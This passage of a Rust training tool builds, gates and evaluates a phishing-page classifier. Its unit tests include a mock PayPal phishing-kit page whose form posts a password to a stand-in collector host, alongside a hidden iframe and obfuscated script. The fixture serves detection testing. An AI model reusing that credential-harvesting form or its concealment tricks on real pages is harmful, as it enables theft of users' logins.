                .map(|k| word_weights[*k as usize])
                .sum::<f32>()
        })
        .sum::<f32>()
        / ln;
    let mut body =
        format!("bias {bias}\nhigh {high}\nelevated {elevated}\nwords_mean {words_mean}\n");
    for (j, name) in FEATURES.iter().enumerate() {
        let m = legit.iter().map(|e| e.x[j]).sum::<f32>() / ln;
        body.push_str(&format!("feature {name} {} {m}\n", raw[j]));
    }
    for k in &kept {
        body.push_str(&format!("word {} {}\n", vocab[*k], word_weights[*k]));
    }
    for tree in &trees {
        body.push_str(&tree.line(FEATURES));
        body.push('\n');
    }
    let model = match PageModel::parse(&body) {
        Ok(m) => m,
        Err(e) => {
            eprintln!("page: the trained model does not parse: {e}");
            return ExitCode::FAILURE;
        }
    };
    // Measured as the app scores, with the app's code, on sites never trained on.
    let test: Vec<&Counted> = pages.iter().filter(|p| p.3 == 2).map(|p| &p.0).collect();
    let recent: Vec<&Counted> = pages
        .iter()
        .filter(|p| p.3 == 2 && p.2)
        .map(|p| &p.0)
        .collect();
    let summary = format!(
        "test (sites never seen): {}",
        describe(&measure(&model, &test))
    );
    println!("{summary}");
    let mut recent_line = String::new();
    if !recent.is_empty() {
        let new = measure(&model, &recent);
        recent_line = format!("recent pages (sites never seen): {}", describe(&new));
        println!("{recent_line}");
        if let Some(path) = &champion {
            let shipped = match fs::read_to_string(path)
                .map_err(|e| e.to_string())
                .and_then(|t| PageModel::parse(&t).map_err(|e| e.to_string()))
            {
                Ok(m) => measure(&m, &recent),
                Err(e) => {
                    eprintln!("page: {path}: {e}");
                    return ExitCode::FAILURE;
                }
            };
            println!("shipped model on the same pages: {}", describe(&shipped));
            let phishing = recent.iter().filter(|c| c.phishing).count();
            let refused = gate(&new, &shipped, phishing, recent.len() - phishing);
            if !refused.is_empty() {
                println!("refused:");
                for r in &refused {
                    println!("  {r}");
                }
                return ExitCode::from(2);
            }
            println!("passed the gate");
        }
    }
    let names: Vec<&str> = sources
        .iter()
        .map(|(p, _, _)| p.rsplit('/').next().unwrap_or(p))
        .collect();
    let mut out = format!(
        "# Rift AI page model (docs/architecture.md §16.1), written by tools/rift-train page.\n\
         # Data: Phishing Websites Dataset, Ariyadasa, Fernando and Fernando, Mendeley Data 2021, CC BY 4.0\n\
         # (doi:10.17632/n96ncsr5g4.1), and pages fetched by the monthly retrain, as counts.\n\
         # {} pages ({}); split by site 80/10/10; l2 {l2}.\n\
         # {summary}\n",
        pages.len(),
        names.join(", ")
    );
    if !recent_line.is_empty() {
        out.push_str(&format!("# {recent_line}\n"));
    }
    out.push_str(&body);
    if let Err(e) = fs::write(out_path, out) {
        eprintln!("page: {out_path}: {e}");
        return ExitCode::FAILURE;
    }
    ExitCode::SUCCESS
}

fn main() -> ExitCode {
    let args: Vec<String> = std::env::args().collect();
    match args.get(1).map(String::as_str) {
        Some("counts") => counts_cmd(&args[2..]),
        Some("train") => train_cmd(&args[2..]),
        Some("eval") => eval_cmd(&args[2..]),
        _ => {
            eprintln!(
                "usage: page counts <index.sql|index.tsv> <pages-dir> <out.tsv>\n       page train <out-model> --counts FILE[:WEIGHT]... [--recent FILE[:WEIGHT]] [--champion MODEL] [--words on|off] [--trees N]\n       page eval <model> <counts>..."
            );
            ExitCode::FAILURE
        }
    }
}

/// `eval <model> <counts>...`: the model on every page of each counts file.
fn eval_cmd(args: &[String]) -> ExitCode {
    let Some((path, files)) = args.split_first().filter(|(_, f)| !f.is_empty()) else {
        eprintln!("usage: page eval <model> <counts>...");
        return ExitCode::FAILURE;
    };
    let model = match fs::read_to_string(path)
        .map_err(|e| e.to_string())
        .and_then(|t| PageModel::parse(&t).map_err(|e| e.to_string()))
    {
        Ok(m) => m,
        Err(e) => {
            eprintln!("page: {path}: {e}");
            return ExitCode::FAILURE;
        }
    };
    for file in files {
        match read_counts(file) {
            Ok(pages) => {
                let pages: Vec<&Counted> = pages.iter().collect();
                println!("{file}: {}", describe(&measure(&model, &pages)));
            }
            Err(e) => {
                eprintln!("page: {e}");
                return ExitCode::FAILURE;
            }
        }
    }
    ExitCode::SUCCESS
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_dump_is_read_with_escapes_and_commas() {
        let sql = r"INSERT INTO `index` VALUES (1, 'http://a.example/x?a=1,2', '1.html', 1, '2021'),(2,'http://b.example/it\'s','2.html',0,'2021');";
        let r = rows(sql);
        assert_eq!(r.len(), 2);
        assert_eq!(r[0].url, "http://a.example/x?a=1,2");
        assert_eq!(r[0].file, "1.html");
        assert!(r[0].phishing);
        assert_eq!(r[1].url, "http://b.example/it's");
        assert!(!r[1].phishing);
    }

    #[test]
    fn the_gate_refuses_more_false_alarms_fewer_catches_or_too_few_pages() {
        let m = |high: (f64, f64), auc| Measured {
            pages: 1000,
            auc,
            high,
            elevated: high,
        };
        let shipped = m((0.40, 0.004), 0.90);
        assert!(gate(&m((0.45, 0.004), 0.91), &shipped, 500, 500).is_empty());
        assert_eq!(gate(&m((0.45, 0.008), 0.91), &shipped, 500, 500).len(), 1);
        assert_eq!(gate(&m((0.39, 0.004), 0.91), &shipped, 500, 500).len(), 1);
        assert_eq!(gate(&m((0.45, 0.004), 0.89), &shipped, 500, 500).len(), 1);
        assert_eq!(gate(&m((0.45, 0.004), 0.91), &shipped, 100, 500).len(), 1);
        // Never above 1% of legitimate pages, whatever the shipped model does.
        assert_eq!(
            gate(&m((0.9, 0.011), 0.99), &m((0.4, 0.011), 0.9), 500, 500).len(),
            1
        );
    }

    #[test]
    fn a_tsv_index_is_read() {
        let r = index(
            "x/index.tsv",
            "https://a.example/\t1-0.html\t1\nbad line\nhttps://b.example/\t0-1.html\t0\n",
        );
        assert_eq!(r.len(), 2);
        assert!(r[0].phishing && !r[1].phishing);
        assert_eq!(r[1].file, "0-1.html");
    }

    #[test]
    fn a_kit_is_counted_as_the_page_script_counts_it() {
        let url = Url::parse("https://login.paypa1-help.example/signin/").unwrap();
        let html = r##"<html><head><title>PayPal Log in</title><link rel="Shortcut Icon" href="https://www.paypalobjects.com/favicon.ico"></head>
            <body oncontextmenu="return false"><form action="https://collector.example/post.php" method="post">
            <input type="hidden" name="a"><input type="password" name="p"></form>
            <a href="#">Help</a><a href="javascript:void(0)">x</a><a href="/home">home</a><a href="https://www.paypal.com/">p</a>
            <iframe src="https://t.example/" width="0" height="0"></iframe>
            <script>eval(atob('YQ=='))</script><script src="https://cdn.example/x.js"></script>
            <p>Your account has been limited &copy; 2021</p></body></html>"##;
        let k = count(&url, html);
        assert_eq!(
            (k.pw, k.hi, k.fm, k.fx, k.fphp, k.fnull),
            (1, 1, 1, 1, 1, 0)
        );
        assert_eq!((k.a, k.an, k.ax), (4, 2, 1));
        assert_eq!((k.ifr, k.ih, k.sc, k.sx, k.ob), (1, 1, 2, 1, 2));
        assert_eq!((k.fv, k.rc, k.cp), (1, 1, 1));
        assert_eq!(k.title, "PayPal Log in");
        assert!(k.text.contains("Your account has been limited"));
        assert!(!k.text.contains("eval"));
    }
}
